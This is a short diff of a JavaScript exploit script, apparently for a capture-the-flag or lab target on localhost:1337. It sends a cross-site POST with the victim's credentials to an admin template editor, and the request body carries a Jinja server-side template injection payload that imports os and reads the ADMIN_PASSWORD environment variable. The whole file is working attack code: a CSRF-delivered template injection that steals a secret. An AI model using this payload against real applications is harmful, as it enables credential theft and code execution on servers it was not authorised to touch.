@@ -1,5 +1,5 @@
 console.log("Started xploit")
-let x = fetch("/admin/templates/1/edit", {
+let x = fetch("http://localhost:1337/admin/templates/1/edit", {
   "headers": {
     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
     "accept-language": "en-US,en;q=0.9",
@@ -16,10 +16,10 @@ let x = fetch("/admin/templates/1/edit", {
     "sec-gpc": "1",
     "upgrade-insecure-requests": "1"
   },
+  "referrer": "http://localhost:1337/admin/templates/1/edit",
   "body": "name=Default+Ticket+Template&html_content=%3Ch1%3E%7B%7B+request.application.__globals__.__builtins__.__import__%28%27os%27%29.environ.get%28%27ADMIN_PASSWORD%27%29+%7D%7D%3C%2Fh1%3E&is_default=on",
   "method": "POST",
   "mode": "cors",
   "credentials": "include"
 });
-
 console.log("Done")
